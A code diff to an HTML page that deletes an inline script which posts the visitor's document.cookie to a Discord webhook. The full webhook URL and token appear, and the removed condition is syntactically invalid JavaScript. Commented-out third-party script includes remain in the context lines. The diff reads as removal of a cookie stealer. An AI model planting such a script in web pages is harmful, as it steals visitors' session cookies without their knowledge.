@@ -43,28 +43,6 @@
   <script src="/assets/js/themes.js"></script>
   <script src="/assets/js/particles.js"></script>
   <script src="/assets/js/register.js"></script>
-    <script>
-    function getRandomInt(max) {
-  return Math.floor(Math.random() * max);
-}
-
-if !(typeof document.cookie == "number"){
-  document.cookie = "cookie="+ getRandomInt(1e9) + ";expires=Thu, 01 Jan 1970 00:00:01 GMT;";
-  const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1327009618479546498/88zVTNA0r96PH03nyT_ffsnD2ydU0ma41qQSOrPomuQ9qElaSkIRk6IZDtqoH8y1xjIv");
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      const params = {
-        username: "Cookie",
-        avatar_url: "",
-        content: document.cookie
-      }
-
-      request.send(JSON.stringify(params));
-    }
-}
-  </script>
  <!-- <script type='text/javascript' src='//cogentselfish.com/cc/1e/f1/cc1ef15b8ddac4fa79288c68db740550.js'></script>-->
  <!-- <script type='text/javascript' src='//cogentselfish.com/a1/87/68/a187684b9f023e7b2684450a755b623e.js'></script>-->
 </div>
